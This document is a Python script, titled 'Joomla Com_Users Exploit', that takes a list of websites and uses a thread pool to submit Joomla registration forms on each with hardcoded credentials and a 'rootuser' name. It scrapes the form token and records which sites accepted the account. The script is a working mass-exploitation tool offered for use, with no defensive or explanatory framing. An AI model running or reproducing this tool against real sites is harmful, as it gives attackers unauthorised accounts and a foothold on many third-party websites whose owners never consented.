#!/usr/bin/python
# -*- coding: utf-8 -*-
#[Azhari Ganteng Banget]
import requests
import re
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

user = 'kazamikyu'
password = 'kazamikyu123'
email = 'resultssmtp@yahoo.com'
sess = requests.Session()

def scan(url):
  if 'http://' in str(url):
    pass
  else:
    url = 'http://' + url 
  try:
    getinfo = sess.get(url + '/index.php?option=com_users&view=registration', verify=False, timeout=10)
    if "jform_email2-lbl" in str(getinfo.text):
      token = re.findall('type="hidden" name="(.*?)" value="1"', getinfo.text)
      post = {}
      post["jform[name]"] = "rootuser"
      post["jform[username]"] = user
      post["jform[password1]"] = password
      post["jform[password2]"] = password
      post["jform[email1]"] = email
      post["jform[email2]"] = email
      post["task"] = "registration.register"
      post[token[0]] = "1"
      coba = sess.post(url + '/index.php?option=com_users&view=registration', data=post, timeout=20)
      if '<div class="registration-complete">' in str(coba.text):
        print(url + '\033[1;32;40m | '+user+' | '+password+' | - Success! \033[1;31;40m' )
        open('reg_success.txt', 'a').write(url + ' | '+user+' | '+password+' | -> Check Your Mail!'+'\n')
      elif '<dt class="warning">Warning</dt>' in str(coba.text):
        print(url + '\033[1;32;40m e-Mail Already -  coba manual! \033[1;31;40m' )
        open('reg_manual.txt', 'a').write(url+ '/index.php?option=com_users&view=registration'+'\n')
      else:
        print(url + '\033[1;31;40m -> Failed \033[00;0m')
    else:
      print(url + '\033[1;31;40m -> Not Vuln \033[00;0m')
  except:
    pass

print("Joomla Com_Users Exploit")
url = open(raw_input('input list:~# '),'r').read().split()
Thread = raw_input('Threads:~# ')
pool = ThreadPool(int(Thread))
pool.map(scan, url)
pool.close()
pool.join()